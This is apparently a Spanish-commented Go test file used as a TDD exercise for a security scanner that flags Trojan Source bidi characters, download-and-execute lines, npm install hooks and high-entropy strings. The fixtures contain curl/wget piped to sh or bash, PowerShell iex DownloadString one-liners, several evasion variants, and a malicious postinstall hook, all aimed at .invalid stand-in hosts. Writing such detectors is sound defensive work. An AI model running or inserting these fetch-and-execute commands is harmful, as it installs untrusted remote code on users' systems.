// Tests para el paquete analyzer.
//
// Este archivo está pensado para trabajar en modo TDD ("test-driven
// development"): los tests existen ANTES que el código. Al principio ni
// siquiera compilan, porque los tipos todavía no existen. Ese es el "rojo"
// inicial. Tu trabajo es escribir el código hasta que todo quede en verde.
//
// Orden sugerido (de más fácil a más difícil):
//  1. Tipos base: Severity (con su método String), Finding y la interfaz
//     Analyzer. Agrega "stubs" vacíos de los 4 analizadores (structs con
//     Name() y un Analyze() que devuelva nil) para que el archivo compile.
//  2. TestSeverityString
//  3. TestBidi
//  4. TestDownloadExec
//  5. TestInstallHooks
//  6. TestEntropy
//  7. TestAll
//
// Correr un solo test mientras trabajas en él:
//
//	go test ./internal/analyzer -run TestBidi -v
//
// IMPORTANTE: todo el contenido "malicioso" de estos tests es texto inerte.
// Nunca se ejecuta, y los dominios usan .invalid, un TLD reservado que
// jamás resuelve en DNS.
package analyzer

import (
	"fmt"
	"slices"
	"strings"
	"testing"
)

// summarize convierte los hallazgos en strings cortos "línea:severidad",
// por ejemplo "3:high". Comparar slices de strings es mucho más fácil de
// leer en un error que comparar structs completos.
//
// Fíjate que usamos f.Severity con %s: eso solo funciona si Severity
// implementa la interfaz fmt.Stringer (un método String() string).
func summarize(findings []Finding) []string {
	out := []string{} // slice vacío (no nil) para que la comparación sea simple
	for _, f := range findings {
		out = append(out, fmt.Sprintf("%d:%s", f.Line, f.Severity))
	}
	return out
}

// check corre un analizador y compara el resultado con lo esperado.
// También verifica dos reglas que TODO hallazgo debe cumplir:
//   - Rule debe ser igual a a.Name()
//   - File debe ser exactamente el path que recibió Analyze
//
// Recibe la interfaz Analyzer, no un tipo concreto. Por eso funciona con
// cualquiera de los cuatro analizadores: eso es polimorfismo en Go.
func check(t *testing.T, a Analyzer, path, content string, want []string) {
	t.Helper()

	// Analyze recibe []byte. Convertir string -> []byte copia los datos.
	got := a.Analyze(path, []byte(content))

	if !slices.Equal(summarize(got), want) {
		t.Errorf("%s.Analyze(%q):\n got  %v\n want %v", a.Name(), path, summarize(got), want)
	}
	for _, f := range got {
		if f.Rule != a.Name() {
			t.Errorf("Finding.Rule = %q, debe ser %q", f.Rule, a.Name())
		}
		if f.File != path {
			t.Errorf("Finding.File = %q, debe ser %q", f.File, path)
		}
		if f.Message == "" {
			t.Error("Finding.Message vacío: el usuario necesita saber qué se encontró")
		}
	}
}

// none es azúcar para "no espero ningún hallazgo".
var none = []string{}

// ---------------------------------------------------------------------------
// Severity
// ---------------------------------------------------------------------------

// Severity es un tipo propio basado en int:
//
//	type Severity int
//
// con constantes Low, Medium y High creadas con iota.
//
// Requisito: el valor cero de Severity NO debe ser Low. Pista: iota + 1.
// Así, un Finding al que se le olvidó poner severidad se nota de inmediato
// ("unknown") en vez de pasar silenciosamente como "low".
func TestSeverityString(t *testing.T) {
	tests := []struct {
		sev  Severity
		want string
	}{
		{Low, "low"},
		{Medium, "medium"},
		{High, "high"},
		{Severity(0), "unknown"},  // el valor cero
		{Severity(99), "unknown"}, // cualquier valor fuera de rango
	}
	for _, tt := range tests {
		if got := tt.sev.String(); got != tt.want {
			t.Errorf("Severity(%d).String() = %q, want %q", int(tt.sev), got, tt.want)
		}
	}
}

// ---------------------------------------------------------------------------
// Bidi: caracteres de control bidireccional ("Trojan Source")
// ---------------------------------------------------------------------------

// Estos caracteres invisibles reordenan cómo se MUESTRA el texto sin cambiar
// cómo lo lee el compilador. Así, un revisor humano ve un código distinto
// al que realmente se ejecuta.
//
// Requisitos:
//   - Name() == "bidi-unicode"
//   - Un hallazgo High por cada LÍNEA que contenga al menos uno de:
//     U+202A a U+202E y U+2066 a U+2069
//   - Las líneas se numeran desde 1
//   - Si el archivo es binario (contiene un byte 0), no reportar nada
//
// Conceptos que vas a practicar: runes vs bytes. Un caracter como U+202E
// ocupa 3 bytes en UTF-8. Si recorres un string con `for _, r := range s`
// obtienes runes; si recorres un []byte, obtienes bytes sueltos.
// El paquete bytes tiene funciones que ya manejan esto por ti.
func TestBidi(t *testing.T) {
	tests := []struct {
		name    string
		content string
		want    []string
	}{
		{
			name:    "código normal",
			content: "func main() {\n\tfmt.Println(\"hola\")\n}\n",
			want:    none,
		},
		{
			// En Go, "‮" dentro de un string literal es ese caracter.
			// Lo escribimos así porque es invisible en el editor.
			name:    "RLO en la línea 2",
			content: "x := 1\nif admin ‮{ // comentario\n}\n",
			want:    []string{"2:high"},
		},
		{
			name:    "varios en la misma línea cuentan una vez",
			content: "a⁦b⁩c‮d\n",
			want:    []string{"1:high"},
		},
		{
			name:    "en varias líneas",
			content: "‪ uno\nlimpio\n⁧ tres\n",
			want:    []string{"1:high", "3:high"},
		},
		{
			// Acentos y emojis son Unicode legítimo, no deben disparar nada.
			name:    "unicode normal no es sospechoso",
			content: "// configuración: añadir café ☕ y 日本語\n",
			want:    none,
		},
		{
			name:    "archivo binario se ignora",
			content: "\x00\x01\x02‮",
			want:    none,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			check(t, Bidi{}, "main.go", tt.content, tt.want)
		})
	}
}

// ---------------------------------------------------------------------------
// DownloadExec: descargar y ejecutar en la misma línea
// ---------------------------------------------------------------------------

// Requisitos:
//   - Name() == "download-exec"
//   - Un hallazgo High por cada línea que contenga A LA VEZ:
//     a) un comando de descarga: curl, wget, iwr, Invoke-WebRequest o
//     DownloadString (sin distinguir mayúsculas)
//     b) una forma de ejecutar: un pipe a un shell (| sh, | bash,
//     | sudo bash, | zsh...), iex, o Invoke-Expression
//   - Ignorar archivos binarios (byte 0)
//   - Funcionar con líneas MUY largas (más de 64 KB, típicas de archivos
//     minificados). Ver el último caso de prueba.
//
// Pista de diseño: en vez de un regex gigante que contemple todos los
// órdenes posibles, usa DOS regex simples (descarga y ejecución) y exige
// que ambos coincidan en la línea. Compílalos una sola vez a nivel de
// paquete.
//
// Pista sobre \b ("límite de palabra"): sirve para que "| sh" coincida
// pero "| shasum" no.
func TestDownloadExec(t *testing.T) {
	// strings.Repeat construye una línea de 100 KB. Con bufio.Scanner y su
	// configuración por defecto, el escaneo se detiene en una línea así
	// (el límite por defecto es 64 KB) y NO verías la línea maliciosa que
	// viene después. Hay dos formas de resolverlo: investiga
	// bufio.Scanner.Buffer, o separa las líneas con el paquete bytes.
	longLine := strings.Repeat("a", 100*1024)

	tests := []struct {
		name    string
		content string
		want    []string
	}{
		{
			name:    "curl pipe sh",
			content: "#!/bin/sh\ncurl -fsSL https://example.invalid/i.sh | sh\n",
			want:    []string{"2:high"},
		},
		{
			name:    "wget pipe sudo bash",
			content: "wget -qO- https://example.invalid/x | sudo bash\n",
			want:    []string{"1:high"},
		},
		{
			name:    "mayúsculas no esquivan la regla",
			content: "CURL https://example.invalid/x | BASH\n",
			want:    []string{"1:high"},
		},
		{
			name:    "powershell iex con DownloadString",
			content: "iex (New-Object Net.WebClient).DownloadString('https://example.invalid/p.ps1')\n",
			want:    []string{"1:high"},
		},
		{
			name:    "powershell iwr pipe iex",
			content: "iwr https://example.invalid/p.ps1 | iex\n",
			want:    []string{"1:high"},
		},
		{
			// Falso positivo clásico que \b evita: shasum empieza con "sh".
			name:    "curl pipe shasum es legítimo",
			content: "curl -sL https://example.invalid/f.tgz | shasum -a 256\n",
			want:    none,
		},

		// ----- Ronda 2: evasiones encontradas al probar la primera versión -----
		// Todas son formas reales y frecuentes de "descargar y ejecutar".
		{
			// Ruta absoluta al shell: después del "|" no viene "bash" sino "/bin/bash".
			name:    "pipe a ruta absoluta del shell",
			content: "curl -fsSL https://example.invalid/i.sh | /bin/bash\n",
			want:    []string{"1:high"},
		},
		{
			// sudo con opciones entre medio (-E conserva el entorno).
			name:    "sudo con flags",
			content: "curl https://example.invalid/i.sh | sudo -E bash\n",
			want:    []string{"1:high"},
		},
		{
			// Sustitución de comandos: el shell recibe el script como argumento.
			// Es la forma que usa, por ejemplo, el instalador de Homebrew.
			// No hay "|" en la línea, así que necesitas otra alternativa en el regex.
			name:    "bash -c con $(curl)",
			content: "/bin/bash -c \"$(curl -fsSL https://example.invalid/install.sh)\"\n",
			want:    []string{"1:high"},
		},
		{
			name:    "sh -c con $(wget)",
			content: "sh -c \"$(wget -qO- https://example.invalid/i.sh)\"\n",
			want:    []string{"1:high"},
		},
		{
			// Sustitución de procesos: <( ... ) aparece como un archivo para bash.
			name:    "bash <(curl)",
			content: "bash <(curl -s https://example.invalid/i.sh)\n",
			want:    []string{"1:high"},
		},
		{
			// Que tu solución a /bin/bash no rompa el caso shasum.
			name:    "pipe a ruta absoluta de shasum sigue siendo legítimo",
			content: "curl -sL https://example.invalid/f | /usr/bin/shasum -a 256\n",
			want:    none,
		},
		{
			// Hay curl, hay "sh" (en "x.sh") y hay "$(" en la misma línea, pero
			// nada ejecuta lo descargado. Si tu regex para "$(" es demasiado
			// laxo, este caso lo atrapa. Pista: exige que el shell vaya
			// seguido (con espacios y quizá -c y comillas) de $( o <(.
			name:    "x.sh y $( sin ejecución",
			content: "curl -o x.sh https://example.invalid && echo \"$(cat x.sh)\"\n",
			want:    none,
		},
		{
			name:    "solo descarga, sin ejecución",
			content: "curl -o archivo.zip https://example.invalid/f.zip\n",
			want:    none,
		},
		{
			name:    "solo ejecución, sin descarga",
			content: "cat install.sh | sh\n",
			want:    none,
		},
		{
			name:    "binario se ignora",
			content: "\x00curl https://example.invalid | sh\n",
			want:    none,
		},
		{
			name:    "línea larga antes de la maliciosa",
			content: longLine + "\ncurl https://example.invalid/x | sh\n",
			want:    []string{"2:high"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			check(t, DownloadExec{}, "install.sh", tt.content, tt.want)
		})
	}
}

// ---------------------------------------------------------------------------
// InstallHooks: scripts que npm ejecuta automáticamente al instalar
// ---------------------------------------------------------------------------

// Requisitos:
//   - Name() == "install-hooks"
//   - Solo analiza archivos cuyo nombre base sea exactamente
//     "package.json" (pueden estar en subcarpetas). Pista: filepath.Base.
//   - Parsear el JSON con encoding/json en un struct que solo tenga el
//     campo que te interesa: Scripts map[string]string con su struct tag.
//   - Revisar, EN ESTE ORDEN: "preinstall", "install", "postinstall".
//     Ojo: si recorres el map con range, Go devuelve las claves en orden
//     aleatorio (a propósito). Recorre un slice con las claves en orden.
//   - Severidad Medium por defecto; High si el comando contiene "curl" o
//     "wget" (sin distinguir mayúsculas).
//   - Line = 0 (en JSON no rastreamos líneas por ahora).
//   - JSON inválido: no reportar nada (y no hacer panic).
//   - El Message debe incluir el nombre del script (ej. "postinstall").
func TestInstallHooks(t *testing.T) {
	tests := []struct {
		name    string
		path    string
		content string
		want    []string
	}{
		{
			name:    "sin scripts de instalación",
			path:    "package.json",
			content: `{"name":"x","scripts":{"build":"vite build","test":"vitest"}}`,
			want:    none,
		},
		{
			name:    "postinstall inofensivo",
			path:    "package.json",
			content: `{"scripts":{"postinstall":"node scripts/setup.js"}}`,
			want:    []string{"0:medium"},
		},
		{
			name:    "postinstall que descarga",
			path:    "package.json",
			content: `{"scripts":{"postinstall":"curl https://example.invalid/x | sh"}}`,
			want:    []string{"0:high"},
		},
		{
			// Las claves vienen desordenadas en el JSON; el resultado debe
			// salir en el orden fijo preinstall, install, postinstall.
			name:    "los tres, orden fijo",
			path:    "package.json",
			content: `{"scripts":{"postinstall":"echo c","preinstall":"WGET http://example.invalid","install":"echo b"}}`,
			want:    []string{"0:high", "0:medium", "0:medium"},
		},
		{
			name:    "package.json en subcarpeta",
			path:    "packages/core/package.json",
			content: `{"scripts":{"preinstall":"node x.js"}}`,
			want:    []string{"0:medium"},
		},

		// ----- Ronda 2: evasión por tipos en el JSON -----
		{
			// El JSON es VÁLIDO, pero "x" es un número. Al decodificar en
			// map[string]string, json.Unmarshal devuelve error y el
			// analizador se calla. npm, en cambio, ignora "x" y SÍ ejecuta
			// el postinstall (comprobado con npm 10.9.4).
			// Pista: decodifica los scripts en algo más flexible
			// (map[string]any o map[string]json.RawMessage) y quédate solo
			// con los valores que de verdad son strings.
			name:    "otro script no-string no esconde el postinstall",
			path:    "package.json",
			content: `{"scripts":{"postinstall":"curl https://example.invalid/x | sh","x":1}}`,
			want:    []string{"0:high"},
		},
		{
			name:    "otro script como array tampoco",
			path:    "package.json",
			content: `{"scripts":{"x":["a"],"preinstall":"node x.js"}}`,
			want:    []string{"0:medium"},
		},
		{
			// Si el hook mismo no es string, npm no tiene un comando que
			// ejecutar: no lo reportamos.
			name:    "hook que no es string se ignora",
			path:    "package.json",
			content: `{"scripts":{"postinstall":123}}`,
			want:    none,
		},
		{
			name:    "otro archivo .json se ignora",
			path:    "tsconfig.json",
			content: `{"scripts":{"postinstall":"curl x"}}`,
			want:    none,
		},
		{
			// Ojo con strings.HasSuffix(path, "package.json"): este caso lo
			// atraparía por error.
			name:    "nombre parecido se ignora",
			path:    "my-package.json",
			content: `{"scripts":{"postinstall":"curl x"}}`,
			want:    none,
		},
		{
			name:    "json inválido no rompe nada",
			path:    "package.json",
			content: `{"scripts": {"postinstall": `,
			want:    none,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			check(t, InstallHooks{}, tt.path, tt.content, tt.want)
		})
	}

	// Verificación extra: el mensaje menciona qué script es.
	got := InstallHooks{}.Analyze("package.json", []byte(`{"scripts":{"postinstall":"node x"}}`))
	if len(got) == 1 && !strings.Contains(got[0].Message, "postinstall") {
		t.Errorf("el mensaje debe mencionar el script, got %q", got[0].Message)
	}
}

// ---------------------------------------------------------------------------
// Entropy: strings con pinta de datos aleatorios u ofuscados
// ---------------------------------------------------------------------------

// Requisitos:
//   - Name() == "high-entropy"
//   - Struct con dos campos configurables:
//     type Entropy struct { MinLen int; Threshold float64 }
//   - "Haz útil el valor cero": si MinLen es 0 usa 40; si Threshold es 0
//     usa 4.5. Así Entropy{} funciona sin configurar nada.
//   - Extrae "tokens" de cada línea: secuencias de caracteres de base64 y
//     similares, [A-Za-z0-9+/=_-]. Ignora los que midan menos de MinLen.
//   - Calcula la entropía de Shannon de cada token. Si es >= Threshold,
//     reporta un hallazgo Medium en esa línea.
//   - Como máximo UN hallazgo por línea (aunque haya varios tokens).
//   - Ignorar binarios (byte 0).
//   - El Message debe incluir el valor de entropía (ej. "5.06").
//
// Sobre el umbral: 4.5 es un punto de partida razonable, no un estándar.
// Vas a tener que ajustarlo con repos reales. Dos datos medidos para estos
// tests:
//   - un identificador largo normal da ~4.41 (muy cerca: el umbral importa)
//   - el hexadecimal NUNCA pasa de 4.0, porque solo usa 16 símbolos
//     (log2(16) = 4). Con 4.5, un secreto en hex se escapa. Para eso hay
//     que bajar el umbral o tener una regla separada para hex.
func TestEntropy(t *testing.T) {
	// 64 caracteres aleatorios en base64 (generados con openssl rand).
	// Entropía medida: ~5.06.
	const randomB64 = "c7uqK8LoTjOWXP2IZlqL6A7QhwQayddYyqTWg7ew7gjmowvaAUUbEU+epqgR2UWs"
	// 48 caracteres hex. Entropía medida: 4.0 exacto.
	const hex48 = "0123456789abcdef0123456789abcdef0123456789abcdef"
	// Los primeros 32 caracteres de randomB64. Entropía medida: ~4.69.
	const short32 = "c7uqK8LoTjOWXP2IZlqL6A7QhwQayddY"

	tests := []struct {
		name    string
		a       Entropy // probamos distintas configuraciones
		content string
		want    []string
	}{
		{
			name:    "base64 aleatorio en la línea 2",
			a:       Entropy{},
			content: "const a = 1;\nconst payload = \"" + randomB64 + "\";\n",
			want:    []string{"2:medium"},
		},
		{
			name:    "identificador largo normal",
			a:       Entropy{},
			content: "let thisIsAVeryLongButPerfectlyNormalIdentifierNameInSomeCode = 1\n",
			want:    none,
		},
		{
			name:    "repetitivo tiene entropía cero",
			a:       Entropy{},
			content: strings.Repeat("a", 80) + "\n",
			want:    none,
		},
		{
			// El tokenizador corta en ':' y '.', así que una URL larga
			// se parte en pedazos cortos que no llegan a MinLen.
			name:    "url larga no dispara",
			a:       Entropy{},
			content: "https://example.invalid/some/long/path/to/resource/index.html\n",
			want:    none,
		},
		{
			name:    "hex no alcanza el umbral por defecto",
			a:       Entropy{},
			content: hex48 + "\n",
			want:    none,
		},
		{
			name:    "hex sí dispara con umbral más bajo",
			a:       Entropy{Threshold: 3.5},
			content: hex48 + "\n",
			want:    []string{"1:medium"},
		},
		{
			name:    "MinLen mayor que el token",
			a:       Entropy{MinLen: 100},
			content: randomB64 + "\n",
			want:    none,
		},
		{
			// Este token SÍ tiene entropía alta (~4.69), pero mide 32,
			// menos que el MinLen por defecto (40). Si se te olvida aplicar
			// el default cuando MinLen es 0, este caso lo detecta.
			name:    "token corto no llega al MinLen por defecto",
			a:       Entropy{},
			content: short32 + "\n",
			want:    none,
		},
		{
			// El mismo token, con un MinLen más bajo, sí dispara. Esto
			// confirma que el caso anterior pasa por la longitud y no
			// porque la entropía sea baja.
			name:    "token corto con MinLen bajo sí dispara",
			a:       Entropy{MinLen: 20},
			content: short32 + "\n",
			want:    []string{"1:medium"},
		},
		{
			name:    "dos tokens en la misma línea, un solo hallazgo",
			a:       Entropy{},
			content: randomB64 + " " + randomB64 + "\n",
			want:    []string{"1:medium"},
		},
		{
			name:    "binario se ignora",
			a:       Entropy{},
			content: "\x00" + randomB64,
			want:    none,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			check(t, tt.a, "app.js", tt.content, tt.want)
		})
	}

	// El mensaje debe incluir el valor medido con 2 decimales.
	got := Entropy{}.Analyze("x.js", []byte(randomB64))
	if len(got) == 1 && !strings.Contains(got[0].Message, "5.06") {
		t.Errorf("el mensaje debe incluir la entropía (5.06), got %q", got[0].Message)
	}
}

// ---------------------------------------------------------------------------
// All: la lista de analizadores que usará main
// ---------------------------------------------------------------------------

// Requisito: func All() []Analyzer devuelve los cuatro analizadores.
// Este test no conoce los tipos concretos: solo trabaja con la interfaz.
func TestAll(t *testing.T) {
	all := All()
	if len(all) != 4 {
		t.Fatalf("All() devolvió %d analizadores, se esperaban 4", len(all))
	}

	// Un map usado como "set" para detectar nombres repetidos.
	// struct{} ocupa 0 bytes: es la forma idiomática de un set en Go.
	seen := map[string]struct{}{}
	for _, a := range all {
		name := a.Name()
		if name == "" {
			t.Error("un analizador tiene Name() vacío")
		}
		if _, dup := seen[name]; dup {
			t.Errorf("nombre repetido: %q", name)
		}
		seen[name] = struct{}{}
	}

	for _, name := range []string{"install-hooks", "download-exec", "bidi-unicode", "high-entropy"} {
		if _, ok := seen[name]; !ok {
			t.Errorf("falta el analizador %q en All()", name)
		}
	}
}
